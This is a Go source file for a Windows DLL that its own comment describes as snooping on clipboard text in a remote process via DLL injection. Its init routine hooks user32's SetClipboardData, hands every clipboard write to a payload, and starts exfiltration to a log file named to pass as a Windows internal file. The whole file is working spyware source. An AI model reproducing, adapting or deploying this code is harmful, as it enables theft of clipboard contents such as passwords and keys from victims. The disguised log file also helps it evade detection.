//go:build windows
// +build windows

// A DLL that can be used to snoop on clipboard text in a remote process by performing DLL process injection
package main

/*
extern void goClipboardPayload(unsigned int, void*);
typedef void* SETCLIPBOARDDATA(unsigned int, void*);
SETCLIPBOARDDATA *trampoline = 0;
void* SetClipboardDataGateway(unsigned int uFormat, void* hMem)
{
	goClipboardPayload(uFormat,hMem);
	return trampoline(uFormat, hMem);
}
*/
import "C"

import (
	"unsafe"

	"github.com/stavinski/clipsnoop/exfil"
	"github.com/stavinski/winhook"
	"golang.org/x/sys/windows"
)

// get the name of the process
func procName() (string, error) {
	exeName := make([]uint16, 1024)
	execNameLen := uint32(len(exeName))
	if err := windows.QueryFullProcessImageName(windows.CurrentProcess(), 0, &exeName[0], &execNameLen); err != nil {
		return "", err
	}

	return windows.UTF16ToString(exeName), nil
}

// called when DLL loaded into process
func init() {
	modUser32 := windows.NewLazySystemDLL("user32.dll")
	procSetClipboardData := modUser32.NewProc("SetClipboardData")

	trampolineFunc, err := winhook.InstallHook64(procSetClipboardData.Addr(), uintptr(unsafe.Pointer(C.SetClipboardDataGateway)), 5)
	if err != nil {
		return
	}
	C.trampoline = (*C.SETCLIPBOARDDATA)(unsafe.Pointer(trampolineFunc))
	target, err := procName()
	if err != nil {
		// if we can't get the proc name just continue with unknown
		target = "UNKNOWN"
	}
	// all went well setup exfil, setup the log file as something that looks windows internal
	exfil.Initialize(target, "c:\\users\\public\\documents\\AVDAPI.DAT")
}

func main() {
	//no-op
}
